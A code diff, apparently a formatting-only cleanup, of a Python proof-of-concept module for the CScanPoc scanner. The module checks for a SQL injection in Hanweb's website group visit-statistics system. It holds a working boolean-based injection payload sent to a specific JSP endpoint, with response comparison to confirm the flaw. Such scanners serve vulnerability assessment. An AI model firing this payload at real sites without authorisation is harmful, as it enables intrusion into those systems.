@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Hanweb_0011' # 平台漏洞编号，留空
+    vuln_id = 'Hanweb_0011'  # 平台漏洞编号，留空
     name = '大汉网站群访问统计系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-28'  # 漏洞公布时间
     desc = '''
         大汉科技（Hanweb）大汉VC系统，漏洞地址：
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = '大汉网站群访问统计系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '98628920-81f0-4b13-8536-5fab30561bb0'
@@ -32,17 +34,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-    
-            #refer:http://www.wooyun.org/bugs/wooyun-2015-0143776
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2015-0143776
             hh = hackhttp.hackhttp()
-            arg = self.target       
+            arg = self.target
             payload = '/vc/vc/style/opr_copycode.jsp?id=-1'
             getdata1 = '%20or%201%3D1'
             getdata2 = '%20or%201%3D2'
-            code1, head,res1, errcode, _ = hh.http(arg+ payload +getdata1)
-            code2, head,res2, errcode, _ = hh.http(arg+ payload +getdata2)
-            m1 = re.findall('td',res1)
-            m2 = re.findall('td',res2)
+            code1, head, res1, errcode, _ = hh.http(arg + payload + getdata1)
+            code2, head, res2, errcode, _ = hh.http(arg + payload + getdata2)
+            m1 = re.findall('td', res1)
+            m2 = re.findall('td', res2)
 
             if code1 == 200 and code2 == 500 and m1 != m2:
                 #security_hole(arg+payload + "   :sql Injection")
@@ -54,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
